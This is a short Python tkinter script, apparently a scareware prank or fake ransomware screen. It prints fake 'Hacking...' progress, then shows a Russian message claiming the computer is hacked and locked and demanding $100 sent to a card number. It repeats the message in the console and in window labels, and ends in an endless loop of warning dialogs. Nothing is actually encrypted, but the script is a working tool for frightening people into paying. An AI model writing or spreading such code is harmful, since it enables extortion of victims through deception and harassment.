import tkinter as tk
from tkinter import messagebox as ms

print("Hacking... 5%")
print("Hacking... 10%")
print("Hacking... 99%")

val = "Ваш компьютер был взломан и заблокирован! Чтобы разброкировать его, перешлите 100$ на карту 1934 0870 8790 8799"

for i in range(10):
    print(val)
    

root = tk.Tk()
root.title("Ваш компьютер был взломан!")

for i in range(10):
    label = tk.Label(text=val)
    label.pack()

while True:
    ms.showwarning("Ваш компьютер был взломан!", val)
root.mainloop()

